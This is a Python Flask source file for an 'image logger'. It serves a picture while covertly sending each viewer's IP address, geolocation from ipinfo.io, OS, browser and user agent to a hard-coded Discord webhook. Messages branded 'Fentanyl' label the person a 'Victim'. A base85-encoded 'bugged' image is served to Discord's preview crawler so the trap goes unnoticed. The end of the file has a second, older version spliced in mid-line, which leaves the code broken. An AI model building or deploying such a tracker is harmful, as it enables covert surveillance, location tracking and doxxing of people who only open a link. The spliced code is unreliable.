import requests
import base64
import httpagentparser
from flask import Flask, request, Response

app = Flask(__name__)

# Discord webhook URL
WEBHOOK = "https://discord.com/api/webhooks/1402924271604334663/r8fgsa0AXvxV8LmEYlQ7pnyXVYQk3h4a7JeHFOF9-X-rEDpOm7ZPLh0B1t4VUwNUaJD_"

# Default image
bindata = requests.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content

# Bugged image
buggedimg = True
buggedbin = base64.b85decode(
    b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
)

# Format webhook payload for full info
def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "Fentanyl",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Fentanyl strikes again!",
                "color": 16711803,
                "description": "A Victim opened the original Image. You can find their info below.",
                "author": {"name": "Fentanyl"},
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                        "inline": True
                    },
                    {
                        "name": "Advanced Info",
                        "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
                        "inline": False
                    }
                ]
            }
        ],
    }

# Format webhook payload for Discord preview
def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [
            {
                "title": "Fentanyl Alert!",
                "color": 16711803,
                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
                "author": {"name": "Fentanyl"},
                "fields": []
            }
        ],
    }

@app.route("/api/image", methods=["GET"])
def serve_image():
    # Get optional URL parameter
    url_param = request.args.get("url")
    try:
        data = requests.get(url_param).content if url_param else bindata
    except:
        data = bindata

    # Get user agent
    useragent = request.headers.get("user-agent", "No User Agent Found!")
    os, browser = httpagentparser.simple_detect(useragent)

    # Get client IP (x-forwarded-for for Vercel)
    xff = request.headers.get("x-forwarded-for", "N/A")
    
    # If request from Discord preview
    if xff.startswith(("35", "34", "104")) and "discord" in useragent.lower():
        resp_data = buggedbin if buggedimg else bindata
        # Send preview webhook
        try:
            requests.post(WEBHOOK, json=prev(xff, useragent))
        except:
            pass
        return Response(resp_data, mimetype="image/jpeg")
    
    # Normal user request
    else:
        resp_data = data
        # Try fetching IP info for webhook
        try:
            ip_info = requests.get(f"https://ipinfo.io/{xff}/json").json()
            requests.post(
                WEBHOOK,
                json=formatHook(
                    ip_info.get("ip", "N/A"),
                    ip_info.get("city", "N/A"),
                    ip_info.get("region", "N/A"),
                    ip_info.get("country", "N/A"),
                    ip_info.get("loc", "N/A"),
                    ip_info.get("org", "N/A"),
                    ip_info.get("postal", "N/A"),
                    useragent,
                    os,
                    browser
                )
            )
        except:
            pass
        return Response(resp_data, mimetype="image/jpeg")        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return
